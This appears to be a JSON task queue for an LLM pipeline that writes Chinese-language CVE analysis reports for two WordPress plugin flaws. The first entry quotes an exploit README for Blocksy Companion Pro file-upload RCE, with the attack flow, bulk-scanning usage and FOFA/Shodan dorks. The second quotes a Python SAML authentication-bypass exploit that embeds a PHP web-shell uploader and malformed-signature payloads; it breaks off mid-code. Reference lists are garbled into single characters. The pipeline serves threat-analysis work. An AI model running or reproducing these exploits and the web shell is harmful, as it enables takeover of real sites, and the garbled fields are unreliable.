\"o\", \"m\", \"m\", \"e\", \"r\", \"c\", \"e\", \"-\", \"e\", \"x\", \"t\", \"r\", \"a\", \"/\", \"f\", \"e\", \"a\", \"t\", \"u\", \"r\", \"e\", \"s\", \"/\", \"a\", \"d\", \"v\", \"a\", \"n\", \"c\", \"e\", \"d\", \"-\", \"r\", \"e\", \"v\", \"i\", \"e\", \"w\", \"s\", \"/\", \"f\", \"e\", \"a\", \"t\", \"u\", \"r\", \"e\", \".\", \"p\", \"h\", \"p\", \"#\", \"L\", \"8\", \"1\", \"1\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"w\", \"o\", \"r\", \"d\", \"f\", \"e\", \"n\", \"c\", \"e\", \".\", \"c\", \"o\", \"m\", \"/\", \"t\", \"h\", \"r\", \"e\", \"a\", \"t\", \"-\", \"i\", \"n\", \"t\", \"e\", \"l\", \"/\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"i\", \"e\", \"s\", \"/\", \"i\", \"d\", \"/\", \"2\", \"d\", \"f\", \"4\", \"4\", \"9\", \"b\", \"4\", \"-\", \"3\", \"f\", \"3\", \"b\", \"-\", \"4\", \"a\", \"f\", \"c\", \"-\", \"b\", \"3\", \"9\", \"1\", \"-\", \"8\", \"d\", \"8\", \"d\", \"1\", \"1\", \"7\", \"1\", \"0\", \"c\", \"0\", \"7\", \"?\", \"s\", \"o\", \"u\", \"r\", \"c\", \"e\", \"=\", \"c\", \"v\", \"e\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] NVD - CVE-2026-15158\n [description] This vulnerability is only exploitable when the premium version of the plugin (blocksy-companion-pro) is installed with both the WooCommerce Extra (Advanced Reviews) and Custom Fonts extensions active; the free blocksy-companion plugin does not contain the vulnerable code paths.\n [link] https://nvd.nist.gov/vuln/detail/CVE-2026-15158\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2026-15158 - Arbitrary File Upload and RCE in... | WatchStack.io\n [description] Vulnerability Summary. CVE-2026-15158: The Blocksy Companion plugin for WordPress is vulnerable to Arbitrary File Upload in all versions up to, and including, 2.1.46 via the save_attachments function.\n [link] https://watchstack.io/intel/cve/CVE-2026-15158\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2026-15158 Blocksy Companion <= 2.1.46... | Vulners.com\n [description] CVE-2026-15158 Blocksy Companion <= 2.1.46 - Unauthenticated Arbitrary File Upload via 'blc-review-images[]' Parameter.\n [link] https://vulners.com/cve/CVE-2026-15158\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-15158 - Blocksy Companion <= 2.1.46 - Unauthenticated...\n [description] While CVE identifies specific instances of vulnerabilities, CWE categorizes the common flaws or weaknesses that can lead to vulnerabilities. CVE-2026-15158 is associated with the following CWEs\n [link] https://cvefeed.io/vuln/detail/CVE-2026-15158\n [webpage 3 end]\n[webpage 4 begin] [title] CVE: Common Vulnerabilities and Exposures\n [description] Common vulnerabilities and Exposures (CVE). Skip to main content.CVE Virtual Event: CVE in an Era of AI-Enabled Vulnerability Discovery. July 30, 2026 | Virtual.\n [link] https://www.cve.org/\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/2eddb8cfd73dbb0f8cad6a8817cf9880/README.md\n---\n<p align=\"center\">\n  <img src=\"https://img.shields.io/badge/python-3.8+-3776AB?style=flat-square&logo=python&logoColor=white\">\n  <img src=\"https://img.shields.io/badge/CVE-2026--58480-CC0000?style=flat-square\">\n  <img src=\"https://img.shields.io/badge/CVSS-9.8_CRITICAL-CC0000?style=flat-square\">\n  <img src=\"https://img.shields.io/badge/license-MIT-97CA00?style=flat-square\">\n</p>\n\n<h3 align=\"center\">CVE-2026-58480 — Blocksy Companion Pro Unauthenticated File Upload RCE</h3>\n<h4 align=\"center\">Advanced Reviews → save_attachments → Custom Fonts strpos() Bypass → shell.woff2.php</h4>\n\n---\n\n## Overview\n\n**CVE-2026-58480** (also tracked as **CVE-2026-15158**) is a critical (CVSS 9.8) unauthenticated arbitrary file upload vulnerability in **Blocksy Companion Pro** < 2.1.47 — the premium addon for the Blocksy WordPress theme (300,000+ active installs).\n\nThe `save_attachments` AJAX handler in the **Advanced Reviews** feature (part of WooCommerce Extra) accepts file uploads without authentication. The **Custom Fonts** extension validates uploads via `strpos()` substring check for `.woff2` / `.ttf` — not the actual file extension. Attackers bypass this with double-extension filenames like `shell.woff2.php`: `.woff2` matches the substring check, `.php` executes on the server.\n\n### Affected Versions\n\n| Version | Status |\n|---|---|\n| < 2.1.47 | Vulnerable |\n| 2.1.47+ | Patched |\n\n> **Requirements:** Premium license with **WooCommerce Extra** (Advanced Reviews) AND **Custom Fonts** extensions active. The free `blocksy-companion` plugin does not contain the vulnerable code paths.\n\n---\n\n## Vulnerability Mechanism\n\n### Root Cause\n\nThe Custom Fonts extension registers a `wp_check_filetype_and_ext` filter that validates filenames using `strpos()` — a substring match — instead of checking the actual file extension via `PATHINFO_EXTENSION`:\n\n```php\n// framework/premium/extensions/custom-fonts/extension.php#L137 (reconstructed)\nadd_filter('wp_check_filetype_and_ext', function($data, $file, $filename, $mimes, $real_mime) {\n    if (strpos($filename, '.woff2') !== false || \n        strpos($filename, '.ttf') !== false) {\n        $data['ext'] = 'woff2';\n        $data['type'] = 'font/woff2';\n    }\n    return $data;\n}, 10, 5);\n```\n\nThe `save_attachments` function in Advanced Reviews calls standard WordPress upload handling, which invokes this filter. A file named `shell.woff2.php` passes because `.woff2` exists as a substring — the filter does NOT verify it's the final extension.\n\n### Attack Flow\n\n```\nPOST /wp-admin/admin-ajax.php\n  action=blc_save_review_attachments\n  blc-review-images[] = shell.woff2.php (multipart, PHP payload)\n→ wp_check_filetype_and_ext filter: \".woff2\" found → approved\n→ File saved to wp-content/uploads/YYYY/MM/shell.woff2.php\n→ GET /wp-content/uploads/YYYY/MM/shell.woff2.php?cmd=id\n→ RCE as www-data\n```\n\n### Source Code Locations\n\n| File (Trac) | Line | Purpose |\n|---|---|---|\n| `framework/premium/extensions/custom-fonts/extension.php` | 137 | `strpos()` validation filter |\n| `framework/premium/extensions/woocommerce-extra/features/advanced-reviews/feature.php` | 811 | `save_attachments` handler |\n\n---\n\n## Installation\n\n```bash\ngit clone https://github.com/shinthink/CVE-2026-58480.git\ncd CVE-2026-58480\npip install requests\n```\n\n## Usage\n\n```bash\n# Fingerprint target\npython exploit.py -u https://target.com --check\n\n# Full exploit\npython exploit.py -u https://target.com\n\n# Bulk scan\npython exploit.py -f targets.txt -o shells.txt\n```\n\n---\n\n## FOFA / Shodan\n\n```\nFOFA:   body=\"/wp-content/themes/blocksy/\"\nShodan: http.html:\"blocksy-companion\"\n```\n\n---\n\n## References\n\n- [NVD CVE-2026-58480](https://nvd.nist.gov/vuln/detail/CVE-2026-58480)\n- [OpenCVE CVE-2026-15158](https://app.opencve.io/cve/CVE-2026-15158) — parameter `blc-review-images[]`\n- [FreshySites Technical Analysis](https://freshysites.com/security-bulletins/blocksy-companion-plugin-vulnerability-cve-2026-15158/) — `wp_check_filetype_and_ext` filter\n- [Wordfence Advisory](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/blocksy-companion/blocksy-companion-2146)\n- [SecurityPointBreak](https://securitypointbreak.com/2026/07/08/critical-blocksy-wordpress-plugin-bug-lets-attackers-skip-login-entirely/)\n- [VulnCheck Advisory](https://www.vulncheck.com/advisories/blocksy-companion-pro-unauthenticated-file-upload-via-save-attachments)\n- [WordPress Trac — Custom Fonts](https://plugins.trac.wordpress.org/browser/blocksy-companion/tags/2.1.46/framework/premium/extensions/custom-fonts/extension.php#L137)\n- [WordPress Trac — Advanced Reviews](https://plugins.trac.wordpress.org/browser/blocksy-companion/tags/2.1.46/framework/premium/extensions/woocommerce-extra/features/advanced-reviews/feature.php#L811)\n\n---\n\n## Disclaimer\n\nThis exploit is provided for educational and authorized security research only. Do not use against systems without explicit permission from the owner.\n\n\n---\n/tmp/2eddb8cfd73dbb\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+    "retry_count": 1,
+    "max_retries": 5,
+    "priority": 2,
+    "status": "pending",
+    "error_type": "client_error",
+    "last_error": "API返回空结果",
+    "created_at": 1785060173.2748725,
+    "last_attempt": 1785060178.2847166,
+    "next_attempt": 1785060186.2912762,
+    "metadata": {},
+    "task_id": "task_CVE-2026-15158_1785060173",
+    "required_result_fields": [
+      "poc_available",
+      "condition",
+      "fix",
+      "risk_level",
+      "summary",
+      "attack_vector",
+      "affected_component",
+      "poison",
+      "markdown",
+      "repo_name",
+      "repo_url",
+      "cve_url"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-15981",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-15981\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"The SAML Single Sign On \\u2013 SSO Login plugin for WordPress is vulnerable to Authentication Bypass in all versions up to, and including, 5.4.4. This is due to the mo_saml_validate_signature() function performing a loose boolean check on the raw tri-state integer returned by PHP's openssl_verify(), causing an error return value of -1 to be evaluated as truthy and therefore treated as a successful signature verification. This makes it possible for unauthenticated attackers to log in as any existing WordPress user, including administrators, by submitting a crafted SAMLResponse containing an attacker-controlled NameID and a deliberately malformed signature value that triggers an OpenSSL processing error \\u2014 bypassing verification entirely and resulting in wp_set_auth_cookie() being called for the targeted account.\", \"\\u6807\\u9898: SAML SSO\\u8eab\\u4efd\\u8ba4\\u8bc1\\u7ed5\\u8fc7\\u6f0f\\u6d1e\"], \"published_date\": \"2026-07-23T21:17:03.220\", \"last_modified_date\": \"2026-07-24T23:16:50.257\", \"cvss_score\": 9.8, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"p\", \"l\", \"u\", \"g\", \"i\", \"n\", \"s\", \".\", \"t\", \"r\", \"a\", \"c\", \".\", \"w\", \"o\", \"r\", \"d\", \"p\", \"r\", \"e\", \"s\", \"s\", \".\", \"o\", \"r\", \"g\", \"/\", \"b\", \"r\", \"o\", \"w\", \"s\", \"e\", \"r\", \"/\", \"m\", \"i\", \"n\", \"i\", \"o\", \"r\", \"a\", \"n\", \"g\", \"e\", \"-\", \"s\", \"a\", \"m\", \"l\", \"-\", \"2\", \"0\", \"-\", \"s\", \"i\", \"n\", \"g\", \"l\", \"e\", \"-\", \"s\", \"i\", \"g\", \"n\", \"-\", \"o\", \"n\", \"/\", \"t\", \"a\", \"g\", \"s\", \"/\", \"5\", \".\", \"4\", \".\", \"4\", \"/\", \"c\", \"l\", \"a\", \"s\", \"s\", \"-\", \"m\", \"o\", \"-\", \"s\", \"a\", \"m\", \"l\", \"-\", \"l\", \"o\", \"g\", \"i\", \"n\", \"-\", \"v\", \"a\", \"l\", \"i\", \"d\", \"a\", \"t\", \"e\", \".\", \"p\", \"h\", \"p\", \"#\", \"L\", \"1\", \"1\", \"8\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"p\", \"l\", \"u\", \"g\", \"i\", \"n\", \"s\", \".\", \"t\", \"r\", \"a\", \"c\", \".\", \"w\", \"o\", \"r\", \"d\", \"p\", \"r\", \"e\", \"s\", \"s\", \".\", \"o\", \"r\", \"g\", \"/\", \"b\", \"r\", \"o\", \"w\", \"s\", \"e\", \"r\", \"/\", \"m\", \"i\", \"n\", \"i\", \"o\", \"r\", \"a\", \"n\", \"g\", \"e\", \"-\", \"s\", \"a\", \"m\", \"l\", \"-\", \"2\", \"0\", \"-\", \"s\", \"i\", \"n\", \"g\", \"l\", \"e\", \"-\", \"s\", \"i\", \"g\", \"n\", \"-\", \"o\", \"n\", \"/\", \"t\", \"a\", \"g\", \"s\", \"/\", \"5\", \".\", \"4\", \".\", \"4\", \"/\", \"c\", \"l\", \"a\", \"s\", \"s\", \"-\", \"m\", \"o\", \"-\", \"s\", \"a\", \"m\", \"l\", \"-\", \"l\", \"o\", \"g\", \"i\", \"n\", \"-\", \"v\", \"a\", \"l\", \"i\", \"d\", \"a\", \"t\", \"e\", \".\", \"p\", \"h\", \"p\", \"#\", \"L\", \"5\", \"4\", \"1\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"p\", \"l\", \"u\", \"g\", \"i\", \"n\", \"s\", \".\", \"t\", \"r\", \"a\", \"c\", \".\", \"w\", \"o\", \"r\", \"d\", \"p\", \"r\", \"e\", \"s\", \"s\", \".\", \"o\", \"r\", \"g\", \"/\", \"b\", \"r\", \"o\", \"w\", \"s\", \"e\", \"r\", \"/\", \"m\", \"i\", \"n\", \"i\", \"o\", \"r\", \"a\", \"n\", \"g\", \"e\", \"-\", \"s\", \"a\", \"m\", \"l\", \"-\", \"2\", \"0\", \"-\", \"s\", \"i\", \"n\", \"g\", \"l\", \"e\", \"-\", \"s\", \"i\", \"g\", \"n\", \"-\", \"o\", \"n\", \"/\", \"t\", \"a\", \"g\", \"s\", \"/\", \"5\", \".\", \"4\", \".\", \"4\", \"/\", \"c\", \"l\", \"a\", \"s\", \"s\", \"-\", \"m\", \"o\", \"-\", \"s\", \"a\", \"m\", \"l\", \"-\", \"u\", \"t\", \"i\", \"l\", \"i\", \"t\", \"i\", \"e\", \"s\", \".\", \"p\", \"h\", \"p\", \"#\", \"L\", \"4\", \"0\", \"3\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"p\", \"l\", \"u\", \"g\", \"i\", \"n\", \"s\", \".\", \"t\", \"r\", \"a\", \"c\", \".\", \"w\", \"o\", \"r\", \"d\", \"p\", \"r\", \"e\", \"s\", \"s\", \".\", \"o\", \"r\", \"g\", \"/\", \"b\", \"r\", \"o\", \"w\", \"s\", \"e\", \"r\", \"/\", \"m\", \"i\", \"n\", \"i\", \"o\", \"r\", \"a\", \"n\", \"g\", \"e\", \"-\", \"s\", \"a\", \"m\", \"l\", \"-\", \"2\", \"0\", \"-\", \"s\", \"i\", \"n\", \"g\", \"l\", \"e\", \"-\", \"s\", \"i\", \"g\", \"n\", \"-\", \"o\", \"n\", \"/\", \"t\", \"a\", \"g\", \"s\", \"/\", \"5\", \".\", \"4\", \".\", \"4\", \"/\", \"i\", \"n\", \"c\", \"l\", \"u\", \"d\", \"e\", \"s\", \"/\", \"l\", \"i\", \"b\", \"/\", \"S\", \"A\", \"M\", \"L\", \"2\", \"C\", \"o\", \"r\", \"e\", \"/\", \"c\", \"l\", \"a\", \"s\", \"s\", \"-\", \"m\", \"o\", \"-\", \"s\", \"a\", \"m\", \"l\", \"-\", \"x\", \"m\", \"l\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"-\", \"d\", \"s\", \"i\", \"g\", \".\", \"p\", \"h\", \"p\", \"#\", \"L\", \"9\", \"3\", \"8\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"p\", \"l\", \"u\", \"g\", \"i\", \"n\", \"s\", \".\", \"t\", \"r\", \"a\", \"c\", \".\", \"w\", \"o\", \"r\", \"d\", \"p\", \"r\", \"e\", \"s\", \"s\", \".\", \"o\", \"r\", \"g\", \"/\", \"b\", \"r\", \"o\", \"w\", \"s\", \"e\", \"r\", \"/\", \"m\", \"i\", \"n\", \"i\", \"o\", \"r\", \"a\", \"n\", \"g\", \"e\", \"-\", \"s\", \"a\", \"m\", \"l\", \"-\", \"2\", \"0\", \"-\", \"s\", \"i\", \"n\", \"g\", \"l\", \"e\", \"-\", \"s\", \"i\", \"g\", \"n\", \"-\", \"o\", \"n\", \"/\", \"t\", \"a\", \"g\", \"s\", \"/\", \"5\", \".\", \"4\", \".\", \"4\", \"/\", \"i\", \"n\", \"c\", \"l\", \"u\", \"d\", \"e\", \"s\", \"/\", \"l\", \"i\", \"b\", \"/\", \"S\", \"A\", \"M\", \"L\", \"2\", \"C\", \"o\", \"r\", \"e\", \"/\", \"c\", \"l\", \"a\", \"s\", \"s\", \"-\", \"m\", \"o\", \"-\", \"s\", \"a\", \"m\", \"l\", \"-\", \"x\", \"m\", \"l\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"-\", \"k\", \"e\", \"y\", \".\", \"p\", \"h\", \"p\", \"#\", \"L\", \"6\", \"2\", \"1\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"p\", \"l\", \"u\", \"g\", \"i\", \"n\", \"s\", \".\", \"t\", \"r\", \"a\", \"c\", \".\", \"w\", \"o\", \"r\", \"d\", \"p\", \"r\", \"e\", \"s\", \"s\", \".\", \"o\", \"r\", \"g\", \"/\", \"c\", \"h\", \"a\", \"n\", \"g\", \"e\", \"s\", \"e\", \"t\", \"/\", \"3\", \"6\", \"1\", \"1\", \"4\", \"2\", \"1\", \"/\", \"m\", \"i\", \"n\", \"i\", \"o\", \"r\", \"a\", \"n\", \"g\", \"e\", \"-\", \"s\", \"a\", \"m\", \"l\", \"-\", \"2\", \"0\", \"-\", \"s\", \"i\", \"n\", \"g\", \"l\", \"e\", \"-\", \"s\", \"i\", \"g\", \"n\", \"-\", \"o\", \"n\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"w\", \"o\", \"r\", \"d\", \"f\", \"e\", \"n\", \"c\", \"e\", \".\", \"c\", \"o\", \"m\", \"/\", \"t\", \"h\", \"r\", \"e\", \"a\", \"t\", \"-\", \"i\", \"n\", \"t\", \"e\", \"l\", \"/\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"i\", \"e\", \"s\", \"/\", \"i\", \"d\", \"/\", \"b\", \"4\", \"1\", \"2\", \"f\", \"6\", \"0\", \"f\", \"-\", \"6\", \"1\", \"e\", \"a\", \"-\", \"4\", \"7\", \"b\", \"1\", \"-\", \"a\", \"3\", \"e\", \"f\", \"-\", \"1\", \"7\", \"2\", \"7\", \"5\", \"f\", \"7\", \"9\", \"5\", \"1\", \"d\", \"f\", \"?\", \"s\", \"o\", \"u\", \"r\", \"c\", \"e\", \"=\", \"c\", \"v\", \"e\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] CVE-2026-15981 - Exploits & Severity - Feedly\n [description] CVE ID : CVE-2026-15981 Published : July 23, 2026, 9:17 p.m. 26 minutes ago Description : The SAML Single Sign On – SSO Login plugin for WordPress is vulnerable to Authentication Bypass in all versions up to, and including, 5.4.4.\n [link] https://feedly.com/cve/CVE-2026-15981\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2026-15981 - Vulnerability Details - OpenCVE\n [description] CVE-2026-15981 - SAML Single Sign On <= 5.4.4 - Unauthenticated Authentication Bypass via SAMLResponse Parameter.This CVE is not in the KEV list. The EPSS score is 0.00547. Exploitation none. Automatable yes. Technical Impact total.\n [link] https://app.opencve.io/cve/CVE-2026-15981\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2026-15981 - SAML Single Sign On <= 5.4.4 - Unauthenticated...\n [description] While CVE identifies specific instances of vulnerabilities, CWE categorizes the common flaws or weaknesses that can lead to vulnerabilities. CVE-2026-15981 is associated with the following CWEs\n [link] https://cvefeed.io/vuln/detail/CVE-2026-15981\n [webpage 2 end]\n[webpage 3 begin] [title] CVE: Common Vulnerabilities and Exposures\n [description] Common vulnerabilities and Exposures (CVE). Skip to main content.CVE Virtual Event: CVE in an Era of AI-Enabled Vulnerability Discovery. July 30, 2026 | Virtual.\n [link] https://www.cve.org/\n [webpage 3 end]\n[webpage 4 begin] [title] LiteLLM Flaw CVE-2026-42271 Exploited in the Wild, Chains to...\n [description] The vulnerability, tracked as CVE-2026-42271 (CVSS score: 8.7), is a command injection vulnerability that could allow any authenticated user to run arbitrary commands on the host. It affects the following version of the LiteLLM Python package\n [link] https://thehackernews.com/2026/06/litellm-flaw-cve-2026-42271-exploited.html\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/bd2afbd96792dd77c7698aaf5e645621/CVE-2026-15981.py\n---\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# By: Nxploited (Khaled Alenazi) — Nxploited ZeroDay Hub  T.m @Kxploit\nfrom __future__ import annotations\n\nimport base64, hashlib, io, json, os, re, secrets, sys\nimport threading, time, uuid, zipfile\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\nfrom datetime import datetime, timezone, timedelta\nfrom pathlib import Path\nfrom typing import Any, Dict, List, Optional, Tuple\nfrom urllib.parse import urlparse, urljoin\n\ntry:\n    import requests\n    from urllib3.exceptions import InsecureRequestWarning\n    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\nexcept ImportError:\n    print(\"[!] pip install requests\"); raise SystemExit(1)\n\ntry:\n    from lxml import etree\nexcept ImportError:\n    print(\"[!] pip install lxml\"); raise SystemExit(1)\n\nRESULTS_FILE    = \"sms.txt\"\nDEBUG_FILE      = \"sms_debug.json\"\nHTTP_TIMEOUT    = 22\nDEFAULT_THREADS = 5\nVULN_MAX_VER    = \"5.4.4\"\n\nPLUGIN_DIR      = \"nxproof\"\nSHELL_FNAME     = \"Nx.php\"\nSHELL_SIG       = \"Nx-zD\"\n\nPLUGIN_HEADER   = (\n    '<?php\\n'\n    '/**\\n'\n    f' * Plugin Name: {PLUGIN_DIR}\\n'\n    ' * Version: 1.0\\n'\n    ' */\\n'\n)\n\nUPLOADER_PHP = (\n    '<?php\\n'\n    'echo \"Nx-zD \";\\n'\n    'if($_SERVER[\"REQUEST_METHOD\"]===\"POST\"&&isset($_FILES[\"f\"])){\\n'\n    '$d=dirname(__FILE__).\"/\";\\n'\n    '$n=basename($_FILES[\"f\"][\"name\"]);\\n'\n    'if(move_uploaded_file($_FILES[\"f\"][\"tmp_name\"],$d.$n)){\\n'\n    'echo \"OK \".$d.$n;\\n'\n    '}else{echo \"FAIL\";}\\n'\n    '}else{\\n'\n    'echo php_uname().\" \";\\n'\n    '$i=@shell_exec(\"id 2>/dev/null\");if($i)echo trim($i).\" \";\\n'\n    '$w=@shell_exec(\"whoami 2>nul\");if($w)echo trim($w);\\n'\n    '}\\n'\n    '?>\\n'\n    '<form method=\"POST\" enctype=\"multipart/form-data\">\\n'\n    '<input type=\"file\" name=\"f\"><input type=\"submit\" value=\"Upload\">\\n'\n    '</form>'\n)\n\nNS_SAMLP = \"urn:oasis:names:tc:SAML:2.0:protocol\"\nNS_SAML  = \"urn:oasis:names:tc:SAML:2.0:assertion\"\nNS_DS    = \"http://www.w3.org/2000/09/xmldsig#\"\n\nC14N_ALGO   = \"http://www.w3.org/2001/10/xml-exc-c14n#\"\nENVSIG_ALGO = \"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"\n\nPLUGIN_PATH = \"/wp-content/plugins/miniorange-saml-20-single-sign-on/\"\n\nSIG_ALGOS = [\n    (\"rsa-sha1\",   \"http://www.w3.org/2000/09/xmldsig#rsa-sha1\",\n                   \"http://www.w3.org/2000/09/xmldsig#sha1\",         \"sha1\"),\n    (\"rsa-sha256\", \"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\",\n                   \"http://www.w3.org/2001/04/xmlenc#sha256\",        \"sha256\"),\n    (\"rsa-sha384\", \"http://www.w3.org/2001/04/xmldsig-more#rsa-sha384\",\n                   \"http://www.w3.org/2001/04/xmldsig-more#sha384\",  \"sha384\"),\n    (\"rsa-sha512\", \"http://www.w3.org/2001/04/xmldsig-more#rsa-sha512\",\n                   \"http://www.w3.org/2001/04/xmlenc#sha512\",        \"sha512\"),\n]\n\nMALFORMED: List[Tuple[str, bytes]] = []\nfor _sz in (256, 384, 512, 128, 64):\n    MALFORMED.append((f\"0xFF*{_sz}\", b\"\\xff\" * _sz))\nMALFORMED += [\n    (\"0x00_01_ff*254\",  b\"\\x00\\x01\" + b\"\\xff\" * 254),\n    (\"0x00_01_ff*126\",  b\"\\x00\\x01\" + b\"\\xff\" * 126),\n    (\"null_2B\",         b\"\\x00\\x01\"),\n    (\"rand_3B\",         secrets.token_bytes(3)),\n    (\"rand_7B\",         secrets.token_bytes(7)),\n    (\"asn1_bad\",        b\"\\x30\\x02\\x01\\x00\"),\n    (\"ff_1B\",           b\"\\xff\"),\n]\n\nADMIN_NAMES = {\"admin\", \"administrator\", \"root\", \"webmaster\", \"sysadmin\", \"superadmin\"}\n\nAUTHOR_RE     = re.compile(r'/author/([^/]+)')\nBODY_PATTERNS = [\n    re.compile(r'author-\\w+\">([a-z0-9_.-]+)<'),\n    re.compile(r'/author/([a-z0-9_.-]+)/'),\n    re.compile(r'\"slug\"\\s*:\\s*\"([a-z0-9_.-]+)\"'),\n    re.compile(r'\"username\"\\s*:\\s*\"([a-z0-9_.-]+)\"'),\n]\n\nSAML_SIGS = (\"option=saml_user_login\", \"saml_login\", \"mo-saml\",\n             \"miniorange\", \"saml_sso\", \"mo_saml\")\n\nG = \"\\033[38;5;46m\"; G2 = \"\\033[38;5;40m\"; W = \"\\033[97m\"\nR = \"\\033[91m\"; Y = \"\\033[93m\"; D = \"\\033[90m\"; C = \"\\033[96m\"\nB = \"\\033[1m\"; X = \"\\033[0m\"\n\n_plock = threading.Lock(); _wlock = threading.Lock()\n_dlock = threading.Lock(); _dlog: List[Dict[str, Any]] = []\n\nBANNER = f\"\"\"\n{G}{B}\n  ███████╗███╗   ███╗███████╗\n  ██╔════╝████╗ ████║██╔════╝\n  ███████╗██╔████╔██║███████╗\n  ╚════██║██║╚██╔╝██║╚════██║\n  ███████║██║ ╚═╝ ██║███████║\n  ╚══════╝╚═╝     ╚═╝╚══════╝{X}\n{G2}{B}   ╔══════════════════════════════════════════════════════════╗{X}\n{G2}{B}   ║  miniOrange SAML SSO <= {VULN_MAX_VER}                         ║{X}\n{G2}{B}   ║  openssl_verify() -1 Bypass -> Admin Session           ║{X}\n{G2}{B}   ╚══════════════════════════════════════════════════════════╝{X}\n{W}  By: Nxploited ( Khaled Alenazi ) - Nxploited ZeroDay Hub{X}\n{D}  T.m @Kxploit{X}\n\"\"\"\n\ndef _ansi():\n    try: sys.stdout.reconfigure(encoding=\"utf-8\", errors=\"replace\")\n    except: pass\n    if os.name != \"nt\": return\n    try:\n        import ctypes\n        h = ctypes.windll.kernel32.GetStdHandle(-11); m = ctypes.c_uint32()\n        if ctypes.windll.kernel32.GetConsoleMode(h, ctypes.byref(m)):\n            ctypes.windll.kernel32.SetC\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 